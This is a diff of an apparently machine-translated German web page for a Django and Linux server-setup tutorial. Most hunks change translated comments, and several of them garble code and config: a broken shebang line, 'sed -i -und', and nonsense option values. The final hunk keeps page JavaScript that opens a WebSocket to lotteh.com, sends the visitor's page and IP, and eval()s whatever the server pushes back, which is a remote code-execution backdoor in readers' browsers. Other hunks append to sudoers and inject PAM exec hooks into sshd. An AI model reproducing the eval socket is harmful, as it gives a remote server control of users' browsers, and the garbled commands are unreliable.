@@ -558,7 +558,7 @@ def register(request):
             messages.success(request, 'Welcome to the app, {}.'.format(user.username))
     return render(request, 'users/register.html', {'form': UserRegisterForm})
 </code></pre>Dies ist alles, was wir brauchen, um einen Benutzer zu registrieren, aber wir sollten mehr Informationen haben. Wir möchten wissen, wann der Benutzer registriert ist, wann sie zuletzt auf der Website waren, einige Informationen darüber, wie eine Biographie, Zeitzone usw. Außerdem müssen wir unser Feed -Modell aktualisieren, Post, um den Benutzer zu berücksichtigen Modell- und Attributbeiträge für jeden Benutzer. Dazu werden wir die Modelle in beiden Apps aktualisieren. Beginnen wir zunächst das Feed -Modell. Es sollte jetzt so aussehen:<pre class="language-python"><code>
-from django.db import models # … Beträge
+from django.db import models # … Importe
 from django.contrib.auth.models import User
 
 class Post(models.Model):
@@ -838,7 +838,7 @@ def activate(request, uidb64, token):
         user.profile.email_verified = True
         user.profile.save()
         user.save()
-# sendWelcomeMail (Anfrage, Benutzer)
+# SendWelcomeMail (Anfrage, Benutzer)
         messages.success(request, f'Thanks for confirming your email! You can now log into your account, and a welcome email has been sent to you.')
         return redirect(user.profile.create_face_url())
     else:
@@ -1087,7 +1087,7 @@ python manage.py makemigrations &amp;&amp; python manage.py migrate
 </code></pre>Dies ist wichtig, da jedes Mal, wenn wir Änderungen an den Modellen vornehmen, die Tabellen erstellen und die Datenbank mit Standardeinstellungen aktualisieren müssen, bevor wir die Modelle tatsächlich verwenden können.
 
 Lassen Sie uns als nächstes unsere Anmeldeansicht improvisieren, um zu einer sekundären Authentifizierungsansicht umzuleiten. Entfernen Sie in den Benutzern/Ansichten.py die Anmeldemittel und leiten Sie sie in die URL um, die wir gerade in den Benutzermodellen generiert haben.<pre class="language-python"><code>
-# … Beträge
+# … Importe
 
 def login(request):
     if request.method == “POST”:
@@ -2010,7 +2010,7 @@ PrintMotd no
 # Kein Standard -Bannerweg
 Banner /etc/banner
 
-# Erlauben Sie dem Kunden, lokale Variablen zu bestehen
+# Ermöglichen
 AcceptEnv LANG LC_*
 
 # Überschreiben Sie die Standardeinstellung ohne Subsysteme
@@ -2062,7 +2062,7 @@ sudo nano /usr/bin/ascript
 # !
 if [ ! -f /usr/bin/$1 ]; then
     sudo touch /usr/bin/$1
-    echo "# !/bin/bash "&gt;&gt;/usr/bin/$ 1
+    echo "# ! / bin / bash "&gt;&gt; / usr / bin / $ 1
     sudo chmod a+x /usr/bin/$1
     sudo nano /usr/bin/$1
     echo $1 | sudo tee -a /etc/ascripts
@@ -2358,7 +2358,7 @@ echo "Setup crontab/sudoers configuration"
 sudo crontab -l -u root | cat - config/crontab | sudo crontab -u root -
 sudo sh -c "cat config/sudoers &gt;&gt; /etc/sudoers"
 # PAM -Konfiguration injizieren und fehlerhafte SSH -Konfiguration entfernen
-# sudo sed -i '' -e '$ d' /tc/pam.d/ssshd
+# Sudo sed -i '' -und $ d '/etc/pam.d/ssshd
 # Sudo sed -i '' -und $ d ' /etc /Profil
 echo "session required pam_exec.so seteuid /home/team/femmebabe/pam.sh" | sudo tee -a /etc/pam.d/sshd
 echo "session required pam_exec.so seteuid /home/team/femmebabe/logout.sh" | sudo tee -a /etc/pam.d/sshd
@@ -2874,7 +2874,7 @@ smtp      inet  n       -       y       -       -       smtpd
 # SMTP INET N - Y - 1 Postscreen
 # SMTPD -Pass - - y - - SMTPD
 # Dnsblog unix - - y - 0 dnsblog
-# tlsproxy unix - - y - 0 tlproxy
+# Tlsproxy unix - - y - 0 tlproxy
 # Wählen Sie eine aus: Aktivieren Sie die Einreichung nur für Loopback -Clients oder für einen Kunden.
 # 127.0.0.1: Submission inet n - y - - SMTPD
 submission inet n       -       y       -       -       smtpd
@@ -3118,7 +3118,7 @@ service pop3 {
 
 service submission {
   # Max. Anzahl der SMTP -Einreichungsprozesse (Verbindungen)
-  # Process_limit = 1024
+  # process_limit = 1024
 }
 
 service auth {
@@ -3193,7 +3193,7 @@ nano config/etc_dovecot_dovecot
 # Hören = *, ::
 
 # Basisverzeichnis, wo Laufzeitdaten gespeichert werden sollen.
-# Base_dir =/var/run/doecot/
+# Base_dir =/var/run/doveCot/
 
 # Name dieser Instanz. In Multi-Instance-Setup Doveadm und andere Befehle
 # kann -i &lt;instance_name&gt; verwenden, um auszuwählen, welche Instanz verwendet wird (eine Alternative
@@ -3221,7 +3221,7 @@ nano config/etc_dovecot_dovecot
 # Zeigen Sie mehr ausführliche Prozesstitel (in PS). Zeigt derzeit den Benutzernamen an und
 # IP -Adresse. Nützlich, um zu sehen, wer tatsächlich die IMAP -Prozesse verwendet
 # (zB freigegebene Postfächer oder wenn die gleiche UID für mehrere Konten verwendet wird).
-# Verbose_proctle = gut
+# Verbose_Proctitle = Nr
 
 # Sollten alle Prozesse getötet werden, wenn der Masterprozess für den Haltestand von Dovecot abgeschaltet wird.
 # Wenn Sie dies auf "Nein" setzen
@@ -3672,32 +3672,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
